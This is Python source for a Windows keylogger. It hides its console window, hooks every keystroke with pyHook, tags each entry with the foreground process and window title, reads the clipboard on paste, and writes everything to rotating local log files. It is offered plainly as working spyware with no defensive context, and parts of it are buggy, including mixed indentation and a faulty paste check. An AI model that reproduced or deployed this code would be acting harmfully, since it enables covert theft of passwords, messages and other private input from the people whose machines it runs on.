from ctypes import *
import pythoncom
import pyHook
import win32clipboard
import os
import sys
from datetime import datetime
import time

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None



def hide():
    import win32console,win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True

def create_log_file():
	datetime = time.ctime()
	datetime = '-'.join(datetime.split())
	datetime = datetime.replace(":","")
	target_file = datetime[4:]
	file = open(target_file,'a')
	file.write("Begin Log\n")
	file.close()
	return target_file

target_file = create_log_file()

def writeToFile(filename, key):
 	if key is None:
		 return False
	else:
		try:
			target = open(filename,'a')
			target.write(key)
			target.close()
			return True
		except:
			return False
	
def get_current_process():
	global target_file
	if target_file == False or os.path.getsize(target_file) > 8000L:
		target_file = create_log_file()
	#get a handle to the foreground window
	hwnd = user32.GetForegroundWindow()
	
	#find process ID
	pid = c_ulong(0)
	user32.GetWindowThreadProcessId(hwnd,byref(pid))
	
	#store the current process ID
	process_id = "%d" % pid.value
	
	#grab the executable
	executable = create_string_buffer("\x00" * 512)
	h_process = kernel32.OpenProcess(0x400 | 0x10,False,pid)
	
	psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)
	
	#read its title
	window_title = create_string_buffer("\x00" * 512)
	length = user32.GetWindowTextA(hwnd,byref(window_title),512)
	
	#print out the title is we're in the right process
	#print
	if os.path.getsize(target_file) > 8000L or os.path.getsize(target_file) == 0:
		target_file = create_log_file()
	writeToFile(target_file,"[PID %s - %s - %s ]\n" % (process_id, executable.value,window_title.value))
	#print
	
	#close handles
	kernel32.CloseHandle(hwnd)
	kernel32.CloseHandle(h_process)
	
def KeyStroke(event):
	global current_window
	global target_file	
	if target_file == False or os.path.getsize(target_file) > 8000L:
		target_file = create_log_file()

	#check to see if target changed windows
	if event.WindowName != current_window:
		current_window = event.WindowName
		writeToFile(target_file, get_current_process())
		
	#if they pressed a standard key
	if event.Ascii > 32 and event.Ascii < 127:
		writeToFile(target_file,chr(event.Ascii))
	else:
		if event.Key == "Lcontrol" + "V":
			win32clipboard.OpenClipboard()
			pasted_value = win32clipboard.GetClipboardData()
			win32clipboard.CloseClipboard()
			
			print "[PASTE] - %s" % (pasted_value),
		
		else:
			#print "[%s]" % event.Key,  **FOR OUTPUT TO SCREEN**
			writeToFile(target_file,(event.Key))
	
	return True

#########################################################MAIN#############################################################		

hide()
kl = pyHook.HookManager()
kl.KeyDown = KeyStroke
kl.HookKeyboard()
pythoncom.PumpMessages()			